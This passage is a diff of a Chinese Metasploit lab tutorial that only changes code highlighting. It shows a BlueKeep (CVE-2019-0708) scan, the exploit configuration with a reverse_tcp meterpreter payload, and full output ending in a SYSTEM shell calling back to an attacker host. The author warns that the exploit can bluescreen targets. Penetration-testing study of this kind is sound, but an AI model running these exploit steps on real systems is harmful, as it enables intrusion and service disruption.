@@ -295,67 +295,67 @@ Interact with a module by name or index. For example info <span class="token num
 
 meterpreter <span class="token operator">&gt;</span> 
 </code></pre><p>当出现WIN的字样并且跳出shell就证明成功了</p>
-<pre data-role="codeBlock" data-info="" class="language-text text"><code>meterpreter &gt; sysinfo
-Computer        : WIN-37KNDA6U40V
-OS              : Windows 2008 R2 (6.1 Build 7600).
-Architecture    : x64
-System Language : en_US
-Domain          : WORKGROUP
-Logged On Users : 1
-Meterpreter     : x64/windows
-</code></pre><pre data-role="codeBlock" data-info="" class="language-text text"><code>meterpreter &gt; getuid
-Server username: NT AUTHORITY\SYSTEM
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>meterpreter <span class="token operator">&gt;</span> sysinfo
+Computer        <span class="token builtin class-name">:</span> WIN-37KNDA6U40V
+OS              <span class="token builtin class-name">:</span> Windows <span class="token number">2008</span> R2 <span class="token punctuation">(</span><span class="token number">6.1</span> Build <span class="token number">7600</span><span class="token punctuation">)</span>.
+Architecture    <span class="token builtin class-name">:</span> x64
+System Language <span class="token builtin class-name">:</span> en_US
+Domain          <span class="token builtin class-name">:</span> WORKGROUP
+Logged On Users <span class="token builtin class-name">:</span> <span class="token number">1</span>
+Meterpreter     <span class="token builtin class-name">:</span> x64/windows
+</code></pre><pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>meterpreter <span class="token operator">&gt;</span> getuid
+Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
 </code></pre><p>该说不说，权限比传木马还高</p>
 <h2>cve2019-0708 Windows RDP的RCE漏洞</h2>
 <p>和上面差不多，但是这个漏洞很容易蓝屏盖，所以一般不建议实战使用，poc确定漏洞就可以报送了。不过我们这里是靶场环境，那就可以玩玩getshell</p>
 <p><code>search cve 2019 0708</code></p>
 <p>先用poc扫一遍</p>
 <p><code>use0</code></p>
-<pre data-role="codeBlock" data-info="" class="language-text text"><code>msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.43.155/24
-rhosts =&gt; 192.168.43.155/24
-msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set threads 100
-msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run
-[+] 192.168.43.63:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 auxiliary<span class="token punctuation">(</span>scanner/rdp/cve_2019_0708_bluekeep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.43.155/24
+rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.43.155/24
+msf6 auxiliary<span class="token punctuation">(</span>scanner/rdp/cve_2019_0708_bluekeep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> threads <span class="token number">100</span>
+msf6 auxiliary<span class="token punctuation">(</span>scanner/rdp/cve_2019_0708_bluekeep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
 </code></pre><p>切exp</p>
-<pre data-role="codeBlock" data-info="" class="language-text text"><code>msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; use 1
-[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
-msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.43.63
-rhosts =&gt; 192.168.43.63
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 auxiliary<span class="token punctuation">(</span>scanner/rdp/cve_2019_0708_bluekeep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use <span class="token number">1</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit<span class="token punctuation">(</span>windows/rdp/cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.43.63
+rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.43.63
 </code></pre><p>除了正常的基础配置这个漏洞还需要将target配置到合适的参数，我们的目标是windows7那么就将target设为1</p>
-<pre data-role="codeBlock" data-info="" class="language-text text"><code>Exploit target:
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Exploit target:
 
    Id  Name
    --  ----
-   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
+   <span class="token number">1</span>   Windows <span class="token number">7</span> SP1 / <span class="token number">2008</span> R2 <span class="token punctuation">(</span><span class="token number">6.1</span>.7601 x64<span class="token punctuation">)</span>
 </code></pre><p>run</p>
-<pre data-role="codeBlock" data-info="" class="language-text text"><code>msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 exploit<span class="token punctuation">(</span>windows/rdp/cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
 
-[*] Started reverse TCP handler on 192.168.43.155:4444 
-[*] 192.168.43.63:3389 - Running automatic check ("set AutoCheck false" to disable)
-[*] 192.168.43.63:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
-[+] 192.168.43.63:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
-[*] 192.168.43.63:3389    - Scanned 1 of 1 hosts (100% complete)
-[+] 192.168.43.63:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
-[*] 192.168.43.63:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
-[!] 192.168.43.63:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
-[*] 192.168.43.63:3389 - Surfing channels ...
-[*] 192.168.43.63:3389 - Lobbing eggs ...
-[*] 192.168.43.63:3389 - Forcing the USE of FREE'd object ...
-[!] 192.168.43.63:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
-[*] Sending stage (200774 bytes) to 192.168.43.63
-[*] Meterpreter session 3 opened (192.168.43.155:4444 -&gt; 192.168.43.63:49327) at 2023-12-07 20:22:48 +0800
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.43.155:4444 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389    - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count <span class="token number">1</span>.
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Entering Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">&gt;</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - Surfing channels <span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - Lobbing eggs <span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - Forcing the USE of FREE'd object <span class="token punctuation">..</span>.
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token number">192.168</span>.43.63:3389 - <span class="token operator">&lt;</span>---------------- <span class="token operator">|</span> Leaving Danger Zone <span class="token operator">|</span> ----------------<span class="token operator">&gt;</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200774</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.43.63
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">3</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.43.155:4444 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.43.63:49327<span class="token punctuation">)</span> at <span class="token number">2023</span>-12-07 <span class="token number">20</span>:22:48 +0800
 
-meterpreter &gt; 
-</code></pre><pre data-role="codeBlock" data-info="" class="language-text text"><code>meterpreter &gt; sysinfo
-Computer        : USER-PC
-OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
-Architecture    : x64
-System Language : zh_CN
-Domain          : WORKGROUP
-Logged On Users : 2
-Meterpreter     : x64/windows
-meterpreter &gt; getuid
-Server username: NT AUTHORITY\SYSTEM
+meterpreter <span class="token operator">&gt;</span> 
+</code></pre><pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>meterpreter <span class="token operator">&gt;</span> sysinfo
+Computer        <span class="token builtin class-name">:</span> <span class="token environment constant">USER</span>-PC
+OS              <span class="token builtin class-name">:</span> Windows <span class="token number">7</span> <span class="token punctuation">(</span><span class="token number">6.1</span> Build <span class="token number">7601</span>, Service Pack <span class="token number">1</span><span class="token punctuation">)</span>.
+Architecture    <span class="token builtin class-name">:</span> x64
+System Language <span class="token builtin class-name">:</span> zh_CN
+Domain          <span class="token builtin class-name">:</span> WORKGROUP
+Logged On Users <span class="token builtin class-name">:</span> <span class="token number">2</span>
+Meterpreter     <span class="token builtin class-name">:</span> x64/windows
+meterpreter <span class="token operator">&gt;</span> getuid
+Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
 </code></pre><p>可以看到当时在run的是很脚本有提示一个进入危险区，如果在这时候强制结束脚本设备就会蓝屏，当然可能也不需要手动结束，网络不稳定，传输不稳定，都有可能导致蓝屏</p>
 <p><img src="image/msf%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/1701952053051.png" alt="1701952053051"></p>
 <p>ok结束。</p>
